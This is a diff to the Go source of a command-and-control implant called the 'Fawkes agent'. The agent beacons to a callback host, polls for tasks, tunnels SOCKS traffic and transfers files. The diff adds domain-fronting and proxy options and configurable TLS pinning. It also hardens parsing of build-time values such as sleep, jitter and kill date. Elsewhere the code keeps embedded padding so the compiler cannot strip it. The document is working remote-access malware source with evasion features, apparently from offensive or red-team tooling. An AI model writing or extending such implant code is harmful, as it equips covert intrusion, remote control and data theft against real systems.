@@ -28,9 +28,8 @@ import (
 
 var (
 	// These variables are populated at build time by the Go linker
-	payloadUUID   string = ""
-	c2Profile     string = ""
-	callbackHost  string = ""
+	payloadUUID  string = ""
+	callbackHost string = ""
 	callbackPort  string = "443"
 	userAgent     string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 	sleepInterval string = "10"
@@ -41,6 +40,9 @@ var (
 	debug         string = "false"
 	getURI        string = "/data"
 	postURI       string = "/data"
+	hostHeader    string = ""    // Override Host header for domain fronting
+	proxyURL      string = ""    // HTTP/SOCKS proxy URL (e.g., http://proxy:8080)
+	tlsVerify     string = "none" // TLS verification: none, system-ca, pinned:<fingerprint>
 )
 
 func main() {
@@ -48,13 +50,36 @@ func main() {
 }
 
 func runAgent() {
-	// Convert string build variables to appropriate types
-	callbackPortInt, _ := strconv.Atoi(callbackPort)
-	sleepIntervalInt, _ := strconv.Atoi(sleepInterval)
-	jitterInt, _ := strconv.Atoi(jitter)
-	killDateInt64, _ := strconv.ParseInt(killDate, 10, 64)
-	maxRetriesInt, _ := strconv.Atoi(maxRetries)
-	debugBool, _ := strconv.ParseBool(debug)
+	// Convert string build variables to appropriate types with validation
+	callbackPortInt, err := strconv.Atoi(callbackPort)
+	if err != nil {
+		log.Printf("[WARNING] Invalid callbackPort %q, defaulting to 443", callbackPort)
+		callbackPortInt = 443
+	}
+	sleepIntervalInt, err := strconv.Atoi(sleepInterval)
+	if err != nil || sleepIntervalInt < 0 {
+		log.Printf("[WARNING] Invalid sleepInterval %q, defaulting to 10", sleepInterval)
+		sleepIntervalInt = 10
+	}
+	jitterInt, err := strconv.Atoi(jitter)
+	if err != nil || jitterInt < 0 || jitterInt > 100 {
+		log.Printf("[WARNING] Invalid jitter %q, defaulting to 10", jitter)
+		jitterInt = 10
+	}
+	killDateInt64, err := strconv.ParseInt(killDate, 10, 64)
+	if err != nil {
+		log.Printf("[WARNING] Invalid killDate %q, defaulting to 0 (disabled)", killDate)
+		killDateInt64 = 0
+	}
+	maxRetriesInt, err := strconv.Atoi(maxRetries)
+	if err != nil || maxRetriesInt < 0 {
+		log.Printf("[WARNING] Invalid maxRetries %q, defaulting to 10", maxRetries)
+		maxRetriesInt = 10
+	}
+	debugBool, err := strconv.ParseBool(debug)
+	if err != nil {
+		debugBool = false
+	}
 
 	// Setup logging
 	if debugBool {
@@ -111,6 +136,9 @@ func runAgent() {
 		debugBool,
 		getURI,
 		postURI,
+		hostHeader,
+		proxyURL,
+		tlsVerify,
 	)
 
 	// Initialize C2 profile
@@ -149,12 +177,12 @@ func runAgent() {
 
 	// Start main execution loop - run directly (not as goroutine) so DLL exports block properly
 	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])
-	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt, sleepIntervalInt, debugBool)
+	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt)
 	usePadding() // Reference embedded padding to prevent compiler stripping
 	log.Printf("[INFO] Fawkes agent shutdown complete")
 }
 
-func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, sleepIntervalInt int, debugBool bool) {
+func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int) {
 	// Main execution loop
 	retryCount := 0
 	for {
@@ -163,9 +191,6 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 			log.Printf("[INFO] Context cancelled, exiting main loop")
 			return
 		default:
-			if debugBool {
-				// log.Printf(\"[DEBUG] Main loop iteration (retry count: %d)\", retryCount)
-			}
 			// Drain any pending outbound SOCKS data to include in this poll
 			outboundSocks := socksManager.DrainOutbound()
 
@@ -179,26 +204,17 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 					retryCount = 0 // Reset counter instead of exiting
 					// Sleep longer on repeated failures
 					sleepTime := time.Duration(agent.SleepInterval*3) * time.Second
-					if debugBool {
-						// log.Printf("[DEBUG] Sleeping for extended time %v after max retries", sleepTime)
-					}
 					time.Sleep(sleepTime)
 					continue
 				}
 				// Use the same sleep calculation for error case
 				sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
-				if debugBool {
-					// log.Printf(\"[DEBUG] Sleeping for %v after error\", sleepTime)
-				}
 				time.Sleep(sleepTime)
 				continue
 			}
 
 			// Reset retry count on successful communication
 			retryCount = 0
-			if debugBool {
-				// log.Printf("[DEBUG] GetTasking successful, received %d tasks", len(tasks))
-			}
 
 			// Pass inbound SOCKS messages to the manager for processing
 			if len(inboundSocks) > 0 {
@@ -212,9 +228,6 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 
 			// Sleep before next iteration
 			sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
-			if debugBool {
-				// log.Printf("[DEBUG] Sleeping for %v before next check", sleepTime)
-			}
 			time.Sleep(sleepTime)
 		}
 	}
@@ -257,7 +270,11 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 						if responses, ok := responseData["responses"].([]interface{}); ok && len(responses) > 0 {
 							if firstResp, ok := responses[0].(map[string]interface{}); ok {
 								// Send this response to all active file transfer channels
-								respJSON, _ := json.Marshal(firstResp)
+								respJSON, err := json.Marshal(firstResp)
+								if err != nil {
+									log.Printf("[ERROR] Failed to marshal file transfer response: %v", err)
+									continue
+								}
 								job.BroadcastFileTransfer(json.RawMessage(respJSON))
 							}
 						}
@@ -339,11 +356,11 @@ func calculateSleepTime(interval, jitter int) time.Duration {
 
 	// Freyja-style jitter calculation
 	// Jitter is a percentage (0-100) that creates variation around the interval
-	jitterFloat := float64(rand.Int()%jitter) / float64(100)
+	jitterFloat := float64(rand.Intn(jitter)) / float64(100)
 	jitterDiff := float64(interval) * jitterFloat
 
 	// Randomly add or subtract jitter (50/50 chance)
-	if rand.Int()%2 == 0 {
+	if rand.Intn(2) == 0 {
 		// Add jitter
 		actualInterval := interval + int(jitterDiff)
 		return time.Duration(actualInterval) * time.Second
